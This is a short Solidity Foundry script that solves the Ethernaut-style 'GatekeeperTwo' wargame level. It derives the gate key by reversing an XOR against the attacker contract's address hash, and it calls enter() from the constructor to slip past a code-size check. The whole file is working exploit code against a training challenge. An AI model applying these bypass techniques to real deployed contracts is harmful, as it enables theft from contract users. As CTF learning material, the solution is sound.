// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack
{
    constructor(address target)
    {
        // compute the gatekey by reversing the xor
        bytes8 hashPart = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 gateKey = bytes8( type(uint64).max ^ uint64(hashPart));

        // call enter in constructor while addrs size still 0
        IGatekeeperTwo(target).enter(gateKey);
    }
}


contract GatekeeperTwoSolution is Script
{
    function run() external {
        address instance = 0x3FbB24b1b6F112AC3aAd30b9bC8Cf565EBEA6c49;

        vm.startBroadcast();
        new GatekeeperTwoAttack(instance);
        vm.stopBroadcast();
    }
}
